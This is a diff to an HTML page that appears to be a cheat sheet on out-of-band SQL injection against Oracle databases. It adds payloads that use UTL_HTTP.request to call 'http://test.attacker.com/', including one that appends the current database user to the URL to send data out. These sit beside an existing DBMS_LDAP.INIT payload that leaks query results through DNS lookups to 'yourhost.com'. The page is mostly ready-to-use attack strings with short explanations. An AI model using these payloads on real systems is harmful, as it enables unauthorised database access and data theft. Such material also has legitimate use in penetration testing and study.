@@ -16,4 +16,12 @@ You need to sniff dns resolution requests to yourhost.com<br/>
 You need to sniff dns resolution requests to yourhost.com<br/>
 ?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)<br/>
 <br/>
-{INJECTION} = You want to run the query.</body></html>
+{INJECTION} = You want to run the query.<br/>
+<br/>
+Another variation<br/>
+SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/') -- <br/>
+The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.<br/>
+This Out-of-band technique can also be used to exfiltrate data. The following query can be used.<br/>
+SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM DUAL)) --<br/>
+<br/>
+</body></html>
